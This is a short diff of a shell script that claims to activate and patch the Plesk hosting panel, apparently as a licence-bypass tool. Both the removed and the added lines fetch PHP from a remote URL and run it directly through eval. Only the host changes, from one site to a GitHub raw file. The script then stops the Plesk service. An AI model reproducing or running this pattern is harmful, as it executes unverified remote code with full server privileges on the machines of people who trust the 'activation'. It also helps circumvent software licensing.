@@ -5,7 +5,7 @@ echo "For support email us"
 echo "***********************************"
 sleep 10
 echo "Activating Plesk..."
-plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
+plesk php -er "eval(file_get_contents('https://raw.githubusercontent.com/itwizardo/ple/main/check.php'));"
 echo "Patching Plesk..."
 echo "Stopping Plesk..."
 systemctl stop psa
